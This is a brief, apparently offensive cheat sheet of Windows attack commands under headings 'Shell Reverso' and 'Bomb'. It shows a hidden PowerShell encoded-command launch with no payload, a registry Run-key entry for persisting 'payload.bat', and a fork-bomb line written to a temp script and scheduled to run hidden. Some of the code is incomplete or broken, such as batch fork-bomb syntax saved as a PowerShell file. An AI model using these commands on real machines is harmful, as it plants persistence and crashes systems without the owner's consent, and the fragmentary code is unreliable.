# Shell Reverso
powershell -W hidden -e 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\payload.bat"
# Bomb
Write-Output "%0|%0" | Out-File C:\Windows\Temp\bomb.ps1
$actions = (New-ScheduledTaskAction -Execute "C:\Windows\Temp\bomb.ps1" -Argument Hidden)
